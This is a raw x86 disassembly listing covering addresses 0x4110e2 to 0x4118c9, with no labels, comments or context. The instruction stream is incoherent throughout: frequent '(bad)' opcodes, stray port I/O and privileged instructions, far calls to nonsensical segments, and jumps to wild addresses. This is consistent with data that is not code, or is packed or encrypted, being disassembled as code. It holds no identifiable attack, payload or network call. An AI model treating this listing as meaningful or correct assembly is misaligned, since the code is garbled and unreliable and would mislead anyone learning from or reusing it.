  4110e2:	push   esi
  4110e3:	cs nop
  4110e5:	inc    esp
  4110e6:	ins    DWORD PTR es:[edi],dx
  4110e7:	push   ecx
  4110e8:	pop    DWORD PTR [ecx+edx*2+0x51]
  4110ec:	pop    DWORD PTR [eax+eax*1+0x55]
  4110f0:	push   ecx
  4110f1:	mov    eax,ds:0x441fb134
  4110f6:	add    BYTE PTR [esi],ch
  4110f8:	pop    esi
  4110f9:	repnz out 0xbb,eax
  4110fc:	fsub   DWORD PTR [ecx-0x59a1e102]
  411102:	mov    gs,WORD PTR [ecx+ecx*1+0x3d]
  411106:	mov    ds:0x486db585,al
  41110b:	jmp    0xfef4bcde
  411110:	xchg   esi,eax
  411111:	call   0x358db519
  411116:	xor    ebx,DWORD PTR [ebx+0x8]
  411119:	xchg   ebx,eax
  41111a:	add    ebx,DWORD PTR [ebx+0x9]
  41111d:	add    DWORD PTR [ebx],0x4b
  411120:	or     DWORD PTR [eax+ecx*2-0x3],ebx
  411124:	cmp    esi,esp
  411126:	idiv   DWORD PTR [esi+0x3a042842]
  41112c:	leave  
  41112d:	in     eax,0x87
  41112f:	sub    BYTE PTR [eax],cl
  411131:	jmp    0x9955c339
  411136:	add    al,0x3e
  411138:	(bad)  
  411139:	call   0x624a4240
  41113e:	dec    edi
  41113f:	ins    DWORD PTR es:[edi],dx
  411140:	rcr    BYTE PTR [ebx],cl
  411142:	test   al,0x27
  411144:	mov    ds,WORD PTR [esp+eax*1-0x7262f6cf]
  41114b:	std    
  41114c:	mov    eax,0x825d1f61
  411151:	sbb    edx,eax
  411153:	add    BYTE PTR [ebx+0x6f687a0b],dl
  411159:	sbb    al,0xad
  41115b:	xchg   ecx,eax
  41115c:	in     eax,dx
  41115d:	lods   al,BYTE PTR ds:[esi]
  41115e:	jne    0x411177
  411160:	and    DWORD PTR [ecx+0x9314bb8],0x94d1f6a
  41116a:	out    dx,al
  41116b:	xchg   DWORD PTR [ecx+ecx*1-0x17],esi
  41116f:	add    esi,DWORD PTR [edx+0x26045914]
  411175:	lea    ebp,[esp+eax*1]
  411178:	xor    DWORD PTR [ecx],ecx
  41117a:	push   0x1f
  41117c:	or     eax,0xb6e60009
  411181:	dec    edi
  411182:	(bad)  
  411183:	call   0x25b5a7ba
  411188:	fst    st(0)
  41118a:	pop    esp
  41118b:	push   ds
  41118c:	rol    BYTE PTR [eax+0x1cd02144],1
  411192:	cld    
  411193:	push   cs
  411194:	push   ds
  411195:	sar    esi,0x7c
  411198:	(bad)  
  411199:	lods   eax,DWORD PTR ds:[esi]
  41119a:	pop    esi
  41119b:	pushf  
  41119c:	xchg   ecx,eax
  41119d:	xchg   esi,eax
  41119e:	addr16 mov esi,0x1004817
  4111a4:	xchg   esi,eax
  4111a5:	dec    esi
  4111a6:	add    cl,ch
  4111a8:	add    ah,BYTE PTR [ecx]
  4111aa:	aaa    
  4111ab:	inc    esp
  4111ac:	jb     0x4111b7
  4111ae:	call   FWORD PTR [ebp+ebp*8-0x53]
  4111b2:	test   BYTE PTR [eax],ah
  4111b4:	sub    eax,0xa90b09
  4111b9:	inc    esi
  4111ba:	icebp  
  4111bb:	dec    DWORD PTR [bx+0x48]
  4111bf:	add    cl,al
  4111c1:	jae    0x411211
  4111c3:	add    cl,ch
  4111c5:	bound  esp,QWORD PTR [ecx]
  4111c7:	ds or  al,0xf2
  4111ca:	or     bh,bh
  4111cc:	adc    al,0x75
  4111ce:	lods   eax,DWORD PTR ds:[esi]
  4111cf:	push   0xb093520
  4111d4:	test   eax,0x2f67f11e
  4111d9:	push   ss
  4111da:	dec    eax
  4111db:	add    BYTE PTR [ecx-0x16ffb131],dl
  4111e1:	and    ah,BYTE PTR [ecx]
  4111e3:	inc    esi
  4111e4:	add    al,0xf2
  4111e6:	or     bh,bh
  4111e8:	fdivr  QWORD PTR [edx-0x53]
  4111eb:	dec    esp
  4111ec:	mov    al,0x32
  4111ee:	or     DWORD PTR [ebx],ecx
  4111f0:	sub    DWORD PTR [edi],esp
  4111f2:	dec    esp
  4111f3:	push   0xbda632e9
  4111f8:	add    BYTE PTR [edi-0x5],dh
  4111fb:	or     ebp,eax
  4111fd:	stc    
  4111fe:	iret   
  4111ff:	(bad)  
  411200:	jmp    DWORD PTR [edi-0x45]
  411203:	jbe    0x411193
  411205:	leave  
  411206:	or     bh,bh
  411208:	jne    0x41120e
  41120a:	popa   
  41120b:	push   ecx
  41120c:	pop    ecx
  41120d:	daa    
  41120e:	imul   edi,ebp,0x73692475
  411214:	hlt    
  411215:	daa    
  411216:	sti    
  411217:	or     ebp,eax
  411219:	mov    bl,0xcf
  41121b:	(bad)  
  41121c:	inc    DWORD PTR [eax]
  41121e:	out    0xfe,eax
  411220:	out    dx,eax
  411221:	call   FWORD PTR [ebp+0x60]
  411224:	std    
  411225:	jne    0x41121b
  411227:	pusha  
  411228:	imul   ebx,DWORD PTR [ecx-0x29],0x74
  41122c:	std    
  41122d:	jne    0x41121b
  41122f:	je     0x4112a4
  411231:	fsubr  st(7),st
  411233:	repnz or ebp,eax
  411236:	pop    es
  411237:	(bad)  
  411238:	(bad)  
  411239:	push   DWORD PTR [edi-0xe]
  41123c:	(bad)  
  41123d:	call   0x405baa
  411242:	inc    edi
  411243:	ror    eax,cl
  411245:	ret    0x878
  411248:	push   ebp
  411249:	mov    esp,DWORD PTR [eax+ecx*4-0x15e4173e]
  411250:	adc    eax,DWORD PTR ds:0x1118197
  411256:	mov    BYTE PTR [eax],cl
  411258:	lea    eax,[ebp-0x14]
  41125b:	fmul   QWORD PTR [ebp+eax*2+0x458cddb0]
  411262:	in     al,0xdc
  411264:	imul   eax,DWORD PTR [edx],0xe80ff1c7
  41126a:	cmp    DWORD PTR [ebp+edi*8-0x1],edi
  41126e:	fucomi st,st(1)
  411270:	test   DWORD PTR [ecx],0xf287ab31
  411276:	xor    DWORD PTR [edx-0x295b00fe],esp
  41127c:	mov    es,WORD PTR [ecx+eiz*1-0x46]
  411280:	add    eax,0xa2700065
  411285:	popf   
  411286:	je     0x4112a9
  411288:	dec    edx
  411289:	jg     0x4112d1
  41128b:	xor    DWORD PTR [edx+0x2d36c009],esp
  411291:	mov    esp,0x8fa1feff
  411296:	inc    esp
  411297:	std    
  411298:	push   ecx
  411299:	pop    DWORD PTR [ecx+ebp*8+0x71]
  41129d:	pop    DWORD PTR [ebp+eiz*8+0x71]
  4112a1:	sub    BYTE PTR [eax],al
  4112a3:	ficom  WORD PTR [ebx+esi*8]
  4112a6:	out    0xcf,eax
  4112a8:	fwait
  4112a9:	popf   
  4112aa:	(bad)  
  4112ab:	mov    dl,0x2c
  4112ad:	pushf  
  4112ae:	add    BYTE PTR [esi],dh
  4112b0:	sub    eax,0xa1beff5b
  4112b5:	popf   
  4112b6:	je     0x411275
  4112b8:	dec    ecx
  4112b9:	mov    dl,0x63
  4112bb:	lock mov eax,ds:0xa1ee45aa
  4112c1:	add    cl,BYTE PTR [ebx]
  4112c3:	jno    0x41126f
  4112c5:	xchg   DWORD PTR [edx-0x72fd5dcf],esp
  4112cb:	hlt    
  4112cc:	jne    0x411300
  4112ce:	(bad)  
  4112cf:	in     al,dx
  4112d0:	imul   esi,DWORD PTR [edx],0x327df48d
  4112d6:	push   0x32
  4112d8:	adc    DWORD PTR [edi],0x10
  4112db:	pop    ecx
  4112dc:	rcl    BYTE PTR [esi+edi*8-0x7dfe19a],1
  4112e3:	xor    DWORD PTR [ebx+0x31008287],ebp
  4112e9:	mov    ds:0x8f48b02,al
  4112ee:	pop    ebp
  4112ef:	sahf   
  4112f0:	push   ss
  4112f1:	test   BYTE PTR [ebx+0x5d4dadaf],ah
  4112f7:	xor    esp,DWORD PTR [ebp+ecx*2+0x4cbc3351]
  4112fe:	inc    ebp
  4112ff:	xor    ebx,DWORD PTR [ebx+0x41183e0d]
  411305:	mov    eax,ds:0x9317955f
  41130a:	imul   esp,DWORD PTR [eax],0x3e9c0909
  411310:	out    dx,al
  411311:	or     al,0x9d
  411313:	lea    esi,[ecx+0x9]
  411316:	push   ss
  411317:	sahf   
  411318:	not    DWORD PTR [edx-0x7c4ef7db]
  41131e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41131f:	add    esp,esi
  411321:	xchg   edx,eax
  411322:	std    
  411323:	popf   
  411324:	test   DWORD PTR [ebp*2-0x11f68e73],0xe592cf9d
  41132f:	pop    ss
  411330:	mov    ebp,0xbf9feaa1
  411335:	xchg   edx,eax
  411336:	lods   eax,DWORD PTR ds:[esi]
  411337:	inc    edi
  411338:	leave  
  411339:	or     cl,ch
  41133b:	add    esi,DWORD PTR [ecx]
  41133d:	xchg   BYTE PTR [ebx],al
  41133f:	and    BYTE PTR [edi+0x229ce948],dh
  411345:	loopne 0x4113b0
  411347:	fist   WORD PTR [esi]
  411349:	and    DWORD PTR [edi],0x4
  41134c:	add    BYTE PTR [esi+0x4580c91d],cl
  411352:	lea    ebp,[esi+0x43]
  411355:	xor    DWORD PTR [edx+0x280ef51c],edx
  41135b:	push   ebx
  41135c:	inc    esp
  41135d:	xor    DWORD PTR [ebx+ebp*1-0xc6e0954],eax
  411364:	scas   eax,DWORD PTR es:[edi]
  411365:	pop    edi
  411366:	sbb    al,0x0
  411368:	in     eax,0xb5
  41136a:	sbb    eax,0x913d8108
  41136f:	(bad)  
  411370:	data16 jp 0x41133b
  411373:	psubsw mm0,QWORD PTR [edi]
  411376:	jle    0x411363
  411378:	push   0x69
  41137a:	sahf   
  41137b:	(bad)  
  41137c:	aam    0x3a
  41137e:	mov    eax,ds:0x92c59c3d
  411383:	imul   ebx,ecx,0x99f04caf
  411389:	mov    ch,0x1c
  41138b:	or     BYTE PTR [ecx+0x65],al
  41138e:	aaa    
  41138f:	jmp    DWORD PTR [esi]
  411391:	cmp    cl,cl
  411393:	je     0x41137a
  411395:	jmp    0x41135e
  411397:	pop    es
  411398:	jmp    0x2ba90ce5
  41139d:	sbb    DWORD PTR [eax+0x0],ecx
  4113a0:	je     0x411410
  4113a2:	cdq    
  4113a3:	dec    edi
  4113a4:	adc    DWORD PTR [edi+0x2e],eax
  4113a7:	push   esi
  4113a9:	sub    ecx,ecx
  4113ab:	je     0x411392
  4113ad:	sti    
  4113ae:	mov    DWORD PTR [edi],0x4ced00e9
  4113b4:	in     al,dx
  4113b5:	call   0x64411cec
  4113ba:	outs   dx,DWORD PTR ds:[esi]
  4113bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113bc:	dec    edi
  4113bd:	into   
  4113be:	inc    edi
  4113bf:	add    eax,ebp
  4113c1:	mov    ch,0x5f
  4113c3:	xchg   edx,eax
  4113c4:	(bad)  
  4113c5:	bnd jb 0x4113dd
  4113c8:	push   es
  4113c9:	push   0x37
  4113cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113cc:	push   DWORD PTR [ebx]
  4113ce:	aaa    
  4113cf:	fidivr WORD PTR [edi+0x970b0]
  4113d5:	cmp    DWORD PTR [eax-0x3c131540],ecx
  4113db:	test   eax,0xfdf3e872
  4113e0:	mov    edi,0x567c6500
  4113e5:	xor    DWORD PTR [eax+0x20057506],0x6
  4113ec:	add    BYTE PTR [ecx],al
  4113ee:	pop    eax
  4113ef:	mov    bh,dh
  4113f1:	add    DWORD PTR [ebx+ecx*1+0x2b],esp
  4113f5:	rol    BYTE PTR [ecx],0xc8
  4113f8:	push   es
  4113f9:	add    BYTE PTR [ebx+0x18418df9],ch
  4113ff:	add    BYTE PTR [ebx-0x14],0xc8
  411403:	ins    DWORD PTR es:[edi],dx
  411404:	jae    0x41140e
  411406:	cmp    BYTE PTR [eax],0x54
  411409:	call   FWORD PTR [edi-0x77]
  41140c:	test   BYTE PTR [ecx],0xc4
  41140f:	pop    es
  411410:	cmp    eax,0x1a
  411413:	clc    
  411414:	add    eax,0x609d0083
  411419:	(bad)  
  41141a:	je     0x411422
  41141c:	mov    ds:0x41ac9be,al
  411421:	add    BYTE PTR [ebp-0xb19f6b],cl
  411427:	gs add al,0xe8
  41142a:	xchg   edx,eax
  41142b:	mov    ch,0x6d
  41142d:	std    
  41142e:	add    eax,0xa
  411431:	je     0x411438
  411433:	pop    ebx
  411434:	ins    DWORD PTR es:[edi],dx
  411435:	add    BYTE PTR [ebp-0x2a],dh
  411438:	xchg   DWORD PTR [ebx-0x14],edi
  41143b:	enter  0x5f9,0x2b
  41143f:	fdivr  DWORD PTR [esi-0x7e67f740]
  411445:	inc    ebx
  411446:	in     al,dx
  411447:	cmp    BYTE PTR [ebx+esi*2+0x8],dh
  41144b:	jo     0x411442
  41144d:	push   esp
  41144e:	(bad)  
  41144f:	fild   WORD PTR [eax]
  411451:	shl    BYTE PTR [ebp-0x6a],0x87
  411455:	jnp    0x411443
  411457:	mov    cl,bh
  411459:	add    eax,0xcc62312b
  41145e:	sar    DWORD PTR [ecx],0xa2
  411461:	xchg   DWORD PTR [ebp+edx*2-0xe],eax
  411465:	call   0x5655:0x2f7a2974
  41146c:	pop    ss
  41146d:	xchg   edi,esi
  41146f:	icebp  
  411470:	xchg   esp,eax
  411471:	add    BYTE PTR [ebx+0x750435c4],al
  411477:	aaa    
  411478:	sti    
  411479:	ret    
  41147a:	enter  0x7300,0xaa
  41147e:	add    cl,BYTE PTR [ebp-0xcc318c]
  411484:	pushf  
  411485:	call   0x829a:0xcf8436aa
  41148c:	sbb    DWORD PTR [edx],eax
  41148e:	adc    DWORD PTR [esi],eax
  411490:	mov    dl,0x5c
  411492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411493:	(bad)  
  411494:	jge    0x411436
  411496:	in     eax,dx
  411497:	mov    edi,0xbe3e8
  41149c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41149d:	pop    esp
  41149e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41149f:	dec    edi
  4114a0:	out    dx,al
  4114a1:	je     0x4114ad
  4114a3:	call   0xfeda81f3
  4114a8:	mov    dl,0x9
  4114aa:	in     al,0x74
  4114ac:	das    
  4114ad:	and    ebx,DWORD PTR [ecx]
  4114af:	in     al,dx
  4114b0:	xor    DWORD PTR ds:0x58f12b01,edx
  4114b6:	les    eax,FWORD PTR [edi]
  4114b8:	xor    DWORD PTR ds:0x4c61ec40,ebx
  4114be:	in     al,0xfe
  4114c0:	and    al,0xaa
  4114c2:	stos   BYTE PTR es:[edi],al
  4114c3:	and    eax,0x8c99c6fc
  4114c8:	hlt    
  4114c9:	mov    ebp,0xaa1cff32
  4114ce:	stos   BYTE PTR es:[edi],al
  4114cf:	xchg   ebp,eax
  4114d0:	in     eax,0x5e
  4114d2:	cdq    
  4114d3:	or     BYTE PTR [ecx+0x2a15e808],0x8c
  4114da:	mov    al,ds:0x6a06fe06
  4114df:	sbb    BYTE PTR [eax],al
  4114e1:	pop    ebp
  4114e2:	or     BYTE PTR [edx+eax*1],dl
  4114e5:	sbb    cl,cl
  4114e7:	scas   eax,DWORD PTR es:[edi]
  4114e8:	lds    esi,FWORD PTR [esi]
  4114ea:	or     DWORD PTR [edx+0x1b],ecx
  4114ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114ee:	dec    ecx
  4114ef:	jmp    0x18de0a7c
  4114f4:	sbb    DWORD PTR cs:[eax-0x66b6f425],edx
  4114fb:	mov    ah,0x9a
  4114fd:	aaa    
  4114fe:	and    BYTE PTR [edi],bl
  411500:	pop    eax
  411501:	outs   dx,BYTE PTR ds:[esi]
  411502:	or     DWORD PTR [eax+eax*2+0x15],ebx
  411506:	cmp    dl,bl
  411508:	add    al,0x1e
  41150a:	adc    eax,0x19d9aed
  41150f:	inc    ecx
  411510:	daa    
  411511:	pop    es
  411512:	(bad)  
  411513:	sub    eax,0xe901f0cc
  411518:	xor    BYTE PTR [edx-0x5409663],ch
  41151e:	jl     0x4114cb
  411520:	xchg   edi,eax
  411521:	jle    0x4114c4
  411523:	adc    BYTE PTR [ebx],dh
  411525:	out    0x8e,al
  411527:	add    eax,0x738edd10
  41152c:	pop    es
  41152d:	leave  
  41152e:	popf   
  41152f:	call   0x360f:0x2902cf9a
  411536:	mov    ds,WORD PTR [ebx+0xc]
  411539:	mov    esi,0xfbacdd14
  41153e:	mov    ss,ebp
  411540:	cdq    
  411541:	cmp    ecx,ecx
  411543:	push   ebx
  411544:	add    al,0x0
  411546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411547:	adc    al,0xc5
  411549:	lods   al,BYTE PTR ds:[esi]
  41154a:	mov    eax,ds:0x6999be39
  41154f:	retf   
  411550:	jmp    esp
  411552:	xor    dh,BYTE PTR [ebx+ecx*4]
  411555:	mov    ebp,0x910c15a8
  41155a:	fsubr  QWORD PTR [edi+edi*8]
  41155d:	sahf   
  41155e:	and    al,0xc9
  411560:	jae    0x41152c
  411562:	leave  
  411563:	adc    eax,0x41953910
  411568:	pop    ebp
  411569:	xchg   BYTE PTR [eax-0x47f97c2],bh
  41156f:	int    0xff
  411571:	jne    0x4115b1
  411573:	icebp  
  411574:	(bad)  
  411575:	hlt    
  411576:	push   esi
  411577:	ds (bad) 
  411579:	fsubr  QWORD PTR [edx]
  41157b:	mov    eax,ds:0x8f986987
  411580:	out    0x15,eax
  411582:	push   0xffffff8e
  411584:	(bad)  
  411585:	and    bh,ch
  411587:	stc    
  411588:	call   FWORD PTR [ebx-0x16985e53]
  41158e:	xor    bl,BYTE PTR [esi+0x2a98c1bd]
  411594:	inc    ecx
  411595:	jmp    0x934d2a43
  41159a:	cld    
  41159b:	mov    ?,WORD PTR [ecx+esi*8-0x36]
  41159f:	pop    ebp
  4115a0:	(bad)  
  4115a1:	push   ss
  4115a2:	enter  0x25,0xe9
  4115a6:	cdq    
  4115a7:	dec    ebx
  4115a8:	add    BYTE PTR ds:[bx+di],dl
  4115ac:	dec    eax
  4115ad:	add    dh,bh
  4115af:	daa    
  4115b0:	std    
  4115b1:	imul   edx,ebx,0x10814a9
  4115b7:	dec    edx
  4115b8:	(bad)  
  4115b9:	(bad)  
  4115ba:	out    0xa,al
  4115bc:	or     DWORD PTR [eax],eax
  4115be:	into   
  4115bf:	pop    eax
  4115c0:	es scas al,BYTE PTR es:[edi]
  4115c2:	dec    ebp
  4115c3:	repnz or bh,bh
  4115c6:	push   esp
  4115c7:	cmp    DWORD PTR [ebx],esp
  4115c9:	sbb    al,0x0
  4115cb:	ja     0x4115cb
  4115cd:	pop    es
  4115ce:	call   0x3e86dd
  4115d3:	lock add al,0x0
  4115d6:	out    dx,eax
  4115d7:	push   ss
  4115d8:	loop   0x411590
  4115da:	fs dec ecx
  4115dc:	add    eax,0xdb8475ff
  4115e1:	sbb    edi,edi
  4115e3:	dec    ebp
  4115e4:	std    
  4115e5:	out    0x6b,eax
  4115e7:	mov    bh,0x70
  4115e9:	std    
  4115ea:	push   0xbeef0948
  4115ef:	inc    eax
  4115f0:	and    esp,DWORD PTR [ebx+0x41]
  4115f3:	pop    eax
  4115f4:	jo     0x411669
  4115f6:	or     al,0x32
  4115f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115f9:	std    
  4115fa:	jne    0x41163c
  4115fc:	popa   
  4115fd:	push   edx
  4115fe:	call   edi
  411600:	jo     0x411668
  411602:	add    BYTE PTR [eax],bl
  411604:	bound  edi,QWORD PTR [eax+ebp*2+0x40ecbf]
  41160b:	ja     0x411608
  41160d:	or     ebp,DWORD PTR [edx+0x0]
  411610:	sub    esi,DWORD PTR [edx+0x73]
  411613:	or     BYTE PTR [eax-0x4d],dh
  411616:	std    
  411617:	call   DWORD PTR [edi-0x41]
  41161a:	ror    BYTE PTR [eax],0x8
  41161d:	fmul   QWORD PTR [edx-0x5b37414]
  411623:	push   0xffffffd8
  411625:	fidiv  WORD PTR [ecx]
  411627:	(bad)  
  411628:	mov    ebp,0xbdcde800
  41162d:	jno    0x41162c
  41162f:	mov    DWORD PTR [ebp-0x42b0998c],ecx
  411635:	inc    edi
  411636:	add    bh,bh
  411638:	cmp    eax,0xd74de800
  41163d:	je     0x41163c
  41163f:	call   FWORD PTR [ebp+0x71]
  411642:	std    
  411643:	jne    0x411676
  411645:	stos   BYTE PTR es:[edi],al
  411646:	stos   BYTE PTR es:[edi],al
  411647:	idiv   esp
  411649:	mov    edx,0x9e73c896
  41164e:	add    dl,BYTE PTR [ebp-0x56]
  411651:	mov    esi,0x488dc382
  411656:	add    al,0x6a
  411658:	inc    edx
  411659:	pop    ebx
  41165a:	adc    BYTE PTR [eax],cl
  41165c:	mov    DWORD PTR [esi+0x1976ff30],eax
  411662:	inc    ecx
  411663:	cld    
  411664:	(bad)  
  411666:	and    BYTE PTR [ecx+0x31],al
  411669:	jnp    0x41167b
  41166b:	or     BYTE PTR [ecx-0x5a],cl
  41166e:	xchg   ebp,eax
  41166f:	(bad)  
  411670:	push   esi
  411671:	or     edx,DWORD PTR [ecx]
  411673:	cld    
  411674:	add    BYTE PTR [esi-0x73],cl
  411677:	or     ch,al
  411679:	outs   dx,BYTE PTR ds:[esi]
  41167a:	cmc    
  41167b:	xchg   esi,eax
  41167c:	(bad)  
  41167d:	push   0xdcffffe0
  411682:	push   ss
  411683:	test   al,0x82
  411685:	cmc    
  411686:	cmp    DWORD PTR [edx],ebp
  411688:	add    BYTE PTR [ebx+0x297496f6],bl
  41168e:	cmp    ch,BYTE PTR [ebx]
  411690:	push   ebp
  411691:	push   ss
  411692:	retf   
  411693:	mov    WORD PTR [ebp+ecx*1-0x36],es
  411697:	sub    ah,BYTE PTR [ebp+0x70]
  41169a:	mov    ds:0xfa297495,al
  41169f:	stos   BYTE PTR es:[edi],al
  4116a0:	std    
  4116a1:	imul   dl
  4116a3:	sub    DWORD PTR [eax],eax
  4116a5:	pop    ecx
  4116a6:	sub    ah,BYTE PTR [ecx]
  4116a8:	inc    ecx
  4116a9:	xor    DWORD PTR [edx-0x5d8f9af2],ecx
  4116af:	xchg   ebp,eax
  4116b0:	xor    al,0x9f
  4116b2:	pop    ecx
  4116b3:	inc    ebx
  4116b4:	add    cl,bl
  4116b6:	mov    ebp,0xa6c6ff39
  4116bb:	ret    0xfe73
  4116be:	or     BYTE PTR [eax+0x40],dh
  4116c1:	mov    ecx,0x6e55e020
  4116c6:	or     DWORD PTR [ecx+0x4],eax
  4116c9:	xor    DWORD PTR [esi+ecx*4+0x2824cf2b],ebx
  4116d0:	add    al,0x96
  4116d2:	adc    eax,0x10596c1
  4116d7:	rcl    ecx,0x0
  4116da:	pop    es
  4116db:	mov    WORD PTR [ebp+0x284a782b],gs
  4116e1:	add    al,0x9
  4116e3:	or     ecx,ebp
  4116e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e6:	lods   al,BYTE PTR ds:[esi]
  4116e7:	and    BYTE PTR [esi+0x1f],bl
  4116ea:	lock or BYTE PTR [esi-0x474a6f0],cl
  4116f1:	or     ecx,DWORD PTR [ecx-0x10]
  4116f4:	std    
  4116f5:	xchg   esi,eax
  4116f6:	dec    edi
  4116f7:	mov    edi,ebx
  4116f9:	fwait
  4116fa:	dec    esi
  4116fb:	rcl    DWORD PTR ds:0xdb8b3f97,0x97
  411702:	aaa    
  411703:	adc    eax,0x346aabf1
  411708:	push   esi
  411709:	xchg   esi,eax
  41170a:	stc    
  41170b:	(bad)  
  41170c:	in     al,0x3
  41170e:	test   BYTE PTR [esi+0x54],bh
  411711:	xor    dl,0x8d
  411714:	rol    BYTE PTR [ebx],cl
  411716:	fwait
  411717:	aam    0x35
  411719:	adc    BYTE PTR [ecx],bh
  41171b:	mov    eax,ds:0x8afe2f48
  411720:	outs   dx,DWORD PTR ds:[esi]
  411721:	inc    eax
  411722:	cmc    
  411723:	and    DWORD PTR [ebp+0x20],esi
  411726:	jo     0x411731
  411728:	push   ss
  411729:	adc    BYTE PTR [ecx],bh
  41172b:	mov    eax,ds:0x8adf9588
  411730:	add    eax,0x738ad510
  411735:	or     ebx,ecx
  411737:	(bad)  
  411738:	call   FWORD PTR [ebx+0x2bc88b9f]
  41173e:	add    BYTE PTR [esi-0x768dac76],bh
  411744:	xchg   ebx,eax
  411746:	fstp   QWORD PTR [ebx+0x9]
  411749:	push   0x1f
  41174b:	mov    esp,0x14c10815
  411750:	ss inc esi
  411753:	stos   BYTE PTR es:[edi],al
  411754:	inc    ebp
  411755:	cld    
  411756:	push   ecx
  411757:	push   es
  411758:	and    eax,0x159de941
  41175d:	or     cl,al
  41175f:	xchg   esp,eax
  411760:	mov    esi,?
  411762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411763:	pushf  
  411764:	adc    eax,0x13e9efc
  411769:	call   0xfecb3921
  41176e:	mov    al,ds:0x1c000673
  411773:	test   al,0x9e
  411775:	and    BYTE PTR [ebp+0x30020a9],0x74
  41177c:	mov    esi,DWORD PTR [ecx+eiz*8-0x76]
  411780:	or     al,0x54
  411782:	pushfw 
  411784:	add    DWORD PTR [ebp+ebx*2+0x5d],0x32a86462
  41178c:	mov    dh,BYTE PTR [ecx+eiz*8-0x36]
  411790:	mov    edi,esp
  411792:	inc    esi
  411793:	mov    esp,0xa43d748a
  411798:	adc    al,0x8
  41179a:	inc    ecx
  41179b:	call   0x3c7:0xea2eff36
  4117a2:	jmp    0xebbf5ea7
  4117a7:	push   0xfffffff1
  4117a9:	lea    ebp,[ecx-0x17]
  4117ac:	sbb    cl,dl
  4117ae:	(bad)  
  4117af:	xchg   esp,eax
  4117b0:	sub    ah,BYTE PTR [ecx+0x74b4004c]
  4117b6:	std    
  4117b7:	mov    DWORD PTR [ebp-0x4a50998f],edx
  4117bd:	inc    esi
  4117be:	add    bh,bh
  4117c0:	inc    ebp
  4117c1:	(bad)  
  4117c2:	out    0xcd,eax
  4117c4:	int    0x74
  4117c6:	std    
  4117c7:	inc    DWORD PTR ds:0x9075fd71
  4117cd:	pop    ebp
  4117ce:	jbe    0x411824
  4117d0:	outs   dx,DWORD PTR ds:[esi]
  4117d1:	je     0x41179a
  4117d3:	ret    0x584
  4117d6:	push   ebp
  4117d7:	mov    edi,DWORD PTR [esp+esi*2+0x73]
  4117db:	or     al,0x70
  4117dd:	dec    eax
  4117de:	pop    ebx
  4117df:	dec    edi
  4117e1:	add    al,al
  4117e3:	je     0x411812
  4117e5:	ffree  st(1)
  4117e7:	sbb    DWORD PTR gs:0xcf8fe850,eax
  4117ee:	(bad)  
  4117ef:	call   FWORD PTR [eax]
  4117f1:	je     0x411866
  4117f3:	adc    BYTE PTR [eax],bh
  4117f5:	je     0x41186a
  4117f7:	or     BYTE PTR [eax-0x40002a61],ah
  4117fd:	pop    ebp
  4117fe:	enter  0xcf56,0x74
  411802:	mov    edx,0x8b55053c
  411808:	add    BYTE PTR [ecx+ecx*4-0x3e],bh
  41180c:	clc    
  41180d:	out    0x32,eax
  41180f:	add    BYTE PTR [edx+0x41],ch
  411812:	sahf   
  411813:	jae    0x41181d
  411815:	xor    BYTE PTR [ecx-0x6cb000af],0x43
  41181c:	cld    
  41181d:	xchg   ebx,eax
  41181e:	pop    edi
  41181f:	cmp    BYTE PTR [eax-0x37],cl
  411822:	or     al,0x80
  411824:	aas    
  411825:	or     BYTE PTR [ecx],bl
  411827:	jl     0x411891
  411829:	push   ecx
  41182a:	daa    
  41182b:	inc    ecx
  41182c:	add    BYTE PTR [ecx],dh
  41182e:	(bad)  
  41182f:	stos   BYTE PTR es:[edi],al
  411830:	or     eax,0xb027272
  411835:	icebp  
  411836:	push   es
  411837:	xor    al,0x57
  411839:	fst    DWORD PTR [edx+eiz*1-0x3d943901]
  411840:	jae    0x4118a6
  411842:	jmp    0xe5f81084
  411847:	mov    ebp,DWORD PTR [ecx+0x4b]
  41184a:	sbb    BYTE PTR [bx+si],cl
  41184d:	cdq    
  41184e:	clc    
  41184f:	xchg   edx,eax
  411850:	(bad)  
  411851:	sahf   
  411852:	push   edi
  411853:	sbb    al,bh
  411855:	or     ebp,DWORD PTR [esi-0x6f]
  411858:	je     0x411893
  41185a:	pop    edx
  41185b:	or     al,0xff
  41185d:	xchg   BYTE PTR [edi-0x33868b6e],bh
  411863:	out    0xfe,al
  411865:	cld    
  411866:	jns    0x411802
  411868:	imul   ebp,DWORD PTR [esi-0x59],0xffffff92
  41186c:	add    BYTE PTR [di+0x15],dh
  411870:	inc    ebp
  411871:	add    BYTE PTR [esi+0x1d],bl
  411874:	mov    edi,fs
  411876:	pop    ebp
  411877:	sub    DWORD PTR [ebx+0x17b23afe],edx
  41187d:	adc    ah,cl
  41187f:	(bad)  
  411880:	sbb    al,bh
  411882:	loope  0x41187a
  411884:	sbb    BYTE PTR [eax],cl
  411886:	dec    ecx
  411887:	(bad)  
  411888:	mov    ecx,0xd2da2efe
  41188d:	push   ebp
  41188e:	fist   WORD PTR es:[edx-0x2535e68c]
  411895:	push   ebp
  411896:	push   ss
  411897:	iret   
  411898:	(bad)  
  411899:	xor    dh,cl
  41189b:	mov    BYTE PTR [edx-0x69c0f902],dl
  4118a1:	lods   eax,DWORD PTR ds:[esi]
  4118a2:	cmp    DWORD PTR [edi+0x17],ebp
  4118a5:	test   dh,dh
  4118a7:	or     BYTE PTR [edi+ecx*4-0x640f0211],bl
  4118ae:	retf   0x15db
  4118b1:	xchg   ebx,eax
  4118b2:	jg     0x411906
  4118b4:	sub    cl,BYTE PTR [eax]
  4118b6:	xor    esi,ebx
  4118b8:	jno    0x41185a
  4118ba:	iret   
  4118bb:	std    
  4118bc:	in     al,dx
  4118bd:	fwait
  4118be:	dec    esp
  4118bf:	jecxz  0x4118b6
  4118c1:	xchg   edx,eax
  4118c2:	sub    ecx,DWORD PTR [ecx+0x74]
  4118c5:	lock dec esi
  4118c7:	fs dec ebx
  4118c9:	inc    ebp
